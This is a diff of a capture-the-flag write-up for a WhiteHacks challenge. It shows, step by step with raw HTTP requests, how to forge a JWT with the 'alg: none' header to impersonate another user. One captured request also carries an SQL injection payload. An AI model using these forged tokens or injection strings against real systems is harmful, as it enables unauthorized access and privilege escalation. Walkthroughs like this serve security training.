@@ -83,3 +83,57 @@ Flag: WH2020{0Ld_5ch00l_Sql1}
 JWT is being used alot more in applications lately. Lately, there was a guy who received $100,000 bounty from Apple for a JWT vulnerability (damn!) - https://bhavukjain.com/blog/2020/05/30/zeroday-signin-with-apple/
 
 This challenge involved setting the JWT headers to "alg" : "None", this meant that the signature portion of the JWT will be redundant as there is no signature for the server to check with. If the server does not verify the JWT algorithm, we can spoof the JWT token and escalate our privileges to any user!
+
+We can first retrieve our JWT token
+``````
+GET /api/modules/search/e 'OR 1=1-- a HTTP/1.1
+Host: chals.whitehacks.ctf.sg:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://chals.whitehacks.ctf.sg:5000/home
+Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTYzODIwNjQsImlhdCI6MTU5NjM4MTc2NCwibmJmIjoxNTk2MzgxNzY0LCJpZGVudGl0eSI6MX0.osPzLbz-apKmy2t77ps7hRatSPK4PZTow7eSf4EWbvw
+Connection: close
+Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
+``````
+The JWT token always has 3 segments. The header, payload and signature.
+
+We can first decrypt the JWT at websites like jwt.io
+
+``````
+HEADER:
+{
+  "typ": "JWT",e
+  "alg": "HS256"
+}
+
+PAYLOAD:
+{
+  "exp": 1596382064,
+  "iat": 1596381764,
+  "nbf": 1596381764,
+  "identity": 1
+}
+``````
+So we have to modify the "alg" parameter to "None" and the "identity" parameter to another number. Luckily, JWTs are base64 encoded so we can manually decode and encode them in BurpSuite, our new JWT token will look like this. 
+
+``````
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE1OTYzODIwNjQsImlhdCI6MTU5NjM4MTc2NCwibmJmIjoxNTk2MzgxNzY0LCJpZGVudGl0eSI6M30.
+``````
+We can verify this by heading over to the /identity endpoint
+``````
+GET /identity HTTP/1.1
+Host: chals.whitehacks.ctf.sg:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://chals.whitehacks.ctf.sg:5000/home
+Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE1OTYzODIwNjQsImlhdCI6MTU5NjM4MTc2NCwibmJmIjoxNTk2MzgxNzY0LCJpZGVudGl0eSI6M30.
+Connection: close
+Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
+``````
+
+
+
